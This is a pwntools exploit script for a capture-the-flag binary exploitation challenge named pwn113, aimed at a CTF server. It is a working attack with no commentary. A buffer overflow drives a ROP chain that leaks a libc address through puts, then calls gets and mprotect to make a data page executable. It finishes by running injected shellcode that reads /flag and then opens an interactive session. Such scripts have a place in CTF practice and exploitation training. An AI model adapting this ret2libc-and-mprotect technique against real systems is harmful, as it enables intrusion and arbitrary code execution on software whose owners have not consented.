from pwn import *

context(log_level='debug',arch='amd64', os='linux')

# io = process("./pwn113")
io = remote("pwn.challenge.ctf.show",28276)
elf = ELF("./pwn113")
libc = ELF("./libc6_2.27-0ubuntu3_amd64.so")
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000401ba3
data = 0x603000
# pld = b'a'*(0x418) + p8(0x28)
# pld += p64(pop_rdi)
# pld += p64(puts_got)
# pld += p64(puts_plt)
# pld += p64(main)

pld = b"A"*0x418+p8(0x28)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

io.recvuntil(b">> ")
io.sendline(pld)

puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
mprotect_addr = libc_base + libc.sym["mprotect"]

pop_rsi = libc_base + 0x0000000000023e6a
pop_rdx = libc_base + 0x0000000000001b96

gets_addr = libc_base+libc.sym["gets"]

io.recvuntil(b">> ")

payload = b"A"*0x418+p8(0x28)+p64(pop_rdi)+ p64(data)
#payload = b"A"*0x420 +p64(pop_rdi)+ p64(data)
payload += p64(gets_addr)+p64(pop_rdi)+p64(data)
payload += p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)
payload += p64(7)+p64(mprotect_addr)+ p64(data)

io.sendline(payload)

sh = shellcraft.cat("/flag")
shellcode = asm(sh)
io.sendline(shellcode)

io.interactive()